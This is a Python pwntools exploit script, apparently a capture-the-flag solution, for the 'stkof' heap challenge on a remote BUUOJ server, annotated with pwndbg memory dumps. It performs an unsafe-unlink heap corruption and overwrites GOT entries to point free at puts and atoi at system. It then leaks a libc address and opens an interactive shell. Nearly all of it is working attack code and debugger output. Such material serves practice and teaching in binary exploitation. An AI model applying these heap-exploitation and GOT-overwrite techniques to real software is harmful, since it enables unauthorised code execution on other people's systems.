from pwn import *
from LibcSearcher import *
context.arch='amd64'
# context.log_level="DEBUG"
context.log_level="INFO"

# p = process('./stkof')
p = remote('node3.buuoj.cn',28528)
elf = ELF('./stkof',checksec=False)
bss_heap = 0x602140

def read(content,size,index):
    p.sendline('2')
    p.sendline(str(index))
    p.sendline(str(size))
    p.send(content)
    p.recvuntil('OK\n',timeout=1)

def malloc(size):
    p.sendline('1')
    p.sendline(str(size))
    p.recvuntil('OK\n',timeout=1)

def free(index):
    p.sendline('3')
    p.sendline(str(index))

def debug():
    gdb.attach(p)
    pause()

malloc(0x100)   # index 1

malloc(0x30)    # index 2
malloc(0x80)    # index 3
# debug()

payload = p64(0)
payload += p64(0x20)
payload += p64(bss_heap + 16 - 0x18)
payload += p64(bss_heap + 16 - 0x10)
payload += p64(0x20)
payload = payload.ljust(0x30,'a')

payload += p64(0x30)
payload += p64(0x90)

read(payload,len(payload),2)
# debug()

# addr                prev                size                 status              fd                bk                
# 0xed1000            0x0                 0x1010               Used                None              None
# 0xed2010            0x0                 0x110                Used                None              None
# 0xed2120            0x0                 0x410                Used                None              None
# 0xed2530            0x0                 0x40                 Freed                0x0              0x20
# 0xed2570            0x30                0x90                 Used                None              None
# pwndbg> x/16g 0xed2530
# 0xed2530:   0x0000000000000000  0x0000000000000041
# 0xed2540:   0x0000000000000000  0x0000000000000020
# 0xed2550:   0x0000000000602138  0x0000000000602140
# 0xed2560:   0x0000000000000020  0x6161616161616161
# 0xed2570:   0x0000000000000030  0x0000000000000090 <== set prev_inuse to 0x90(size= 0x90,prev_inuse= 0)
# 0xed2580:   0x0000000000000000  0x0000000000000000
# 0xed2590:   0x0000000000000000  0x0000000000000000
# 0xed25a0:   0x0000000000000000  0x0000000000000000

free(3)
# debug()

# pwndbg> x/16g 0x0000000000602140
# 0x602140:   0x0000000000000000  0x0000000002309020
# 0x602150:   0x0000000000602138  0x0000000000000000 <== bss_heap[2] point to 0x0000000000602138
# 0x602160:   0x0000000000000000  0x0000000000000000
# 0x602170:   0x0000000000000000  0x0000000000000000
# 0x602180:   0x0000000000000000  0x0000000000000000
# 0x602190:   0x0000000000000000  0x0000000000000000
# 0x6021a0:   0x0000000000000000  0x0000000000000000
# 0x6021b0:   0x0000000000000000  0x0000000000000000


payload = "A"*8 + flat([elf.got['free'], elf.got['puts'], elf.got['atoi']])
read(payload,len(payload),2)
# debug()

# pwndbg> x/16g 0x602138
# 0x602138:   0x4141414141414141  0x0000000000602018 <== bss_heap[0] was changed and point to free@got
# 0x602148:   0x0000000000602020  0x0000000000602088 <== also bss_heap[1] and bss_heap[2] was changed, and point to puts@got,atoi@got
# 0x602158:   0x0000000000000000  0x0000000000000000
# 0x602168:   0x0000000000000000  0x0000000000000000
# 0x602178:   0x0000000000000000  0x0000000000000000
# 0x602188:   0x0000000000000000  0x0000000000000000
# 0x602198:   0x0000000000000000  0x0000000000000000
# 0x6021a8:   0x0000000000000000  0x0000000000000000


payload = p64(elf.plt['puts'])
read(payload,len(payload),0)
# debug()

# pwndbg> x/16g 0x0000000000602018
# 0x602018 <free@got.plt>:    0x0000000000400760  0x00007f1ece149690 <== 0x0000000000400760 was point to puts@plt
# 0x602028 <fread@got.plt>:   0x00007f1ece1481a0  0x0000000000400786
# 0x602038 <__stack_chk_fail@got.plt>:    0x0000000000400796  0x00007f1ece12f800
# 0x602048 <alarm@got.plt>:   0x00007f1ece1a6200  0x00007f1ece0fa740
# 0x602058 <fgets@got.plt>:   0x00007f1ece147ad0  0x00007f1ece110eb0
# 0x602068 <__gmon_start__@got.plt>:  0x00000000004007f6  0x00007f1ece15e130
# 0x602078 <fflush@got.plt>:  0x00007f1ece1477a0  0x00007f1ece110ea0
# 0x602088 <atoi@got.plt>:    0x00007f1ece110e80  0x0000000000000000

free(1) 
# function free here will call the reall free in os,
# but the free@got was rewrite to point to put@plt,
# so it wiil call the puts and use index 1's content which is puts@got as a parameter of puts
p.recvuntil('OK\n')
puts_addr = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
log.success('puts_addr = %#x',puts_addr)

libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh = %#x'%(system_addr, binsh))

payload = p64(system_addr)
read(payload, len(payload), 2)
# debug()

# pwndbg> x/16g 0x0000000000602088
# 0x602088 <atoi@got.plt>:    0x00007fe7dfab2390  0x0000000000000000 <== 0x00007fe7dfab2390 was point to the reall address of system
# 0x602098:   0x0000000000000000  0x0000000000000000
# 0x6020a8:   0x0000000000000000  0x0000000000000000
# 0x6020b8:   0x0000000000000000  0x00007fe7dfe32620
# 0x6020c8:   0x0000000000000000  0x00007fe7dfe318e0
# 0x6020d8:   0x0000000000000000  0x0000000000000000
# 0x6020e8:   0x0000000000000000  0x0000000000000000
# 0x6020f8:   0x0000000000000000  0x0000000000000003

p.send(p64(binsh))
# Previous step, atoi@got was rewrite to point to system,
# from the program, when finish some function(ex.read,free,malloc,etc),
# it will call atoi to transfer our input to get corret option,
# but here we rewrite the atoi,
# so it will call system and use our input which is p64(binsh) as a parameter of system
p.interactive()
